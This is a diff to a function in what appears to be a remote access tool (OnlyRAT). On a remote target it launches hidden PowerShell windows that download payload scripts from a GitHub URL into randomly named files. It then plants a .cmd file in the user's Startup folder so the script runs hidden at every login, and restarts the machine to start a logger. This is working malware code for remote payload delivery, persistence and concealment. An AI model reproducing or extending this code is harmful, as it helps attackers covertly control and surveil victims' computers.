@@ -233,20 +233,19 @@ def killswitch(address, password, working, username):
     print("\n[*] Prepping killswitch...")
     # web requests
     killswitch_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killswitch.ps1 -OutFile {working}/TOhjZsWluf.ps1\""
-    # controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/TOhjZsWluf.ps1 >> GiLqXiexKP.cmd"
-    controller_command = f"powershell /c {working}/TOhjZsWluf.ps1"
+    killtask_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killtask.ps1 -OutFile {working}/SaReWIdGnz.ps1\""
+    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SaReWIdGnz.ps1 >> GiLqXiexKP.cmd"
     print("[+] Killswitch prepped")
 
     # installing killswitch
     print("[*] Installing killswitch...")
     remote_command(address, password, killswitch_command)
+    print("[*] Installing scheduler...")
+    remote_command(address, password, killtask_command)
     print("[*] Installing controller...")
     remote_command(address, password, controller_command)
     print("[+] Killswitch installed sucessfully\n")
        
-    # remove files
-    remote_command(address, password, "")
-
     # execute logger
     print("\n[*] Restarting target computer...")
 
